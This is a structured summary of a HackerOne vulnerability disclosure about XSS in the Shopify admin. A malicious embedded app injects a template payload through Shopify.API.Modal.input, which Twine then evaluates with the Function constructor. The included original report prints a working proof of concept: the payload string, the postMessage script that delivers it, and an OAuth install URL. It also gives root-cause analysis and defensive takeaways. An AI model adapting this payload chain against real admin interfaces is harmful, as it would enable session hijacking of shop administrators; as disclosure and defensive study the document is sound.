# XSS in Shopify Admin via Twine Template Injection in Modal.input Method

## Metadata
- **Source:** HackerOne
- **Report:** 217790 | https://hackerone.com/reports/217790
- **Submitted:** 2017-04-02
- **Reporter:** bored-engineer
- **Program:** Shopify
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Template Injection, Improper Input Validation, Context-Aware Encoding Failure
- **CVEs:** None
- **Category:** web-api

## Summary
The Shopify Embedded App SDK's Shopify.API.Modal.input method uses lodash _.template with insufficient context-aware escaping, allowing malicious apps to inject arbitrary JavaScript via the value parameter. The injected payload exploits Twine's template evaluation which uses Function constructor (eval equivalent) to execute attacker-controlled code in the admin domain context.

## Attack scenario
1. Attacker creates a malicious Shopify app and submits it for authorization by a shop administrator
2. Administrator installs the app, granting it access to the embedded app SDK
3. Malicious app uses postMessage to invoke Shopify.API.Modal.input with a crafted value parameter containing template injection payload (e.g., '-alert(document.domain)-')
4. Shopify SDK renders the input modal using lodash _.template, which performs generic HTML escaping but not JSON-context escaping
5. The injected payload breaks out of the JSON string context in the data-define attribute
6. Twine evaluates the malicious data-define attribute via Function constructor, executing arbitrary JavaScript in the admin domain context

## Root cause
lodash _.template provides generic HTML entity escaping (&#39; for quotes) but is not context-aware. When the value parameter is inserted into a JSON object within a data-define attribute, the escaping mechanism fails to account for JSON string context, allowing quote breakout. Additionally, Twine's evaluation mechanism using Function constructor acts as an eval primitive without sandboxing.

## Attacker mindset
An attacker could leverage a seemingly benign app installation to gain XSS in the admin domain. The attack requires social engineering to get admin authorization, but the exploit itself requires no special permissions, making the authorization request less suspicious. Once XSS is achieved, the attacker can perform any action as the authenticated admin user.

## Defensive takeaways
- Implement context-aware output encoding - use JSON-specific escaping when embedding untrusted data in JSON contexts, not just generic HTML escaping
- Avoid eval-equivalent constructs like Function constructor for template evaluation; use safer alternatives or sandboxing
- Implement Content Security Policy (CSP) to restrict script execution and eval-based code generation
- Validate and sanitize all data crossing security boundaries (postMessage communications)
- Use a sandboxed template engine or disable dangerous features like Function constructor in Twine
- Apply defense-in-depth: validate permissions before executing sensitive SDK operations
- Audit third-party libraries (lodash, Twine) for security implications in critical code paths

## Variant hunting
Check other Shopify.API.Modal methods for similar template injection vulnerabilities
Review all uses of _.template throughout the Embedded App SDK for context-aware encoding gaps
Audit other data-define attributes and Twine bindings for similar injection points
Examine postMessage message handlers for insufficient validation of nested data structures
Search for other eval primitives (eval, Function, setTimeout with strings) in admin-context code
Test other SDK methods that accept user input and render UI elements
Review Twine's evaluation of other binding contexts (data-bind-event-*, etc.)

## MITRE ATT&CK
- T1190
- T1059
- T1566
- T1598

## Notes
This vulnerability exemplifies the dangers of chaining encoding failures with dangerous evaluation mechanisms. The use of Function constructor in Twine for evaluating template expressions is fundamentally unsafe. The vulnerability required admin authorization but no specific app permissions, demonstrating how coarse-grained permission models can expose attack surface. The postMessage API's '*' origin specification likely increased attack surface. Shopify's trust boundary between embedded apps and the admin domain was compromised through inadequate input validation.

## Full report
<details><summary>Expand</summary>

#Description
The Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method. While the method automatically provides input escaping the "input" template (used by the `Shopify.API.Modal.input` method) assigns a value to a special `data-define` attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by [twine](http://shopify.github.io/twine/). Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. 

#Technical Details
When the `Shopify.API.Modal.input` method the following "input" template is rendered using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method: 
```html
...
<div class="ui-modal__body" data-define="{typedInput: &#39;[%= value %]&#39;}">
...
<label class="next-label" for="text-a10e7047a92878fc20031f40da0b5231"></label>
<input type="text" id="text-a10e7047a92878fc20031f40da0b5231" data-bind="typedInput" autofocus="autofocus" class="next-input" />
...
<button class="btn close-modal [%= buttonClass %]" data-bind-event-click="closeModal({result: true, data: typedInput})" type="button" name="button">[%= okButton %]</button>
...
```
The `typedInput` parameter is initialized from the `value` template parameter, bound to the text input, and finally used when the "okButton" is clicked. The data binding is handled by Shopify's [twine](http://shopify.github.io/twine/) JS library. Unfortunately because  [_.template](https://lodash.com/docs/4.17.4#template) is not fully context aware it will not provide JSON escaping for this parameter. For example if `value` is set to `some'value` the following invalid JSON will be created in the `data-define` attribute:
```
{typedInput: 'some'value'}
```
Normally this would just break the intended functionality, however if we analyze [twine](http://shopify.github.io/twine/) we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:
```js
wrapFunctionString = function(code, args, node) {
  var e, error, keypath;
  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {
    if (keypath[0] === '$root') {
      return function($context, $root) {
        return getValue($root, keypath);
      };
    } else {
      return function($context, $root) {
        return getValue($context, keypath);
      };
    }
  } else {
    code = "return " + code;
    if (nodeArrayIndexes(node)) {
      code = "with($arrayPointers) { " + code + " }";
    }
    if (requiresRegistry(args)) {
      code = "with($registry) { " + code + " }";
    }
    try {
      return new Function(args, "with($context) { " + code + " }");
    } catch (error) {
      e = error;
      throw "Twine error: Unable to create function on " + node.nodeName + " node with attributes " + (stringifyNodeAttributes(node));
    }
  }
};
``` 
The method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the `value` template parameter it will flow as follows:
```
'-alert(document.domain)-'
``` 
This will result in a `data-define` attribute with the following value:
```js
{typedInput:''-document.domain-''}
```
This will result in the following code executing within twine:
```js
with($context) {
  with($registry) {
    return {typedInput: ''-alert(document.domain)-''}
  }
}
```
Putting this all together with the SDK we get the following script:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.input",
  data: {
    message: {
      message: "", 
      value: "'-alert(document.domain)-'",
    }
  }
}), "*");
```
#Exploitability
You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. 

#Proof of Concept
I've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...
Open the following URL on on `$your-shop$.myshopify.com`:
```
/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce
```
After authorizing the application an alert should appear on the `/admin` window containing `document.domain`.

#Remediation
The "input" template should be updated to make the `value` parameter context-aware, perhaps wrapping in a `JSON.stringify` call.

</details>

---
*Analysed by Claude on 2026-05-12*
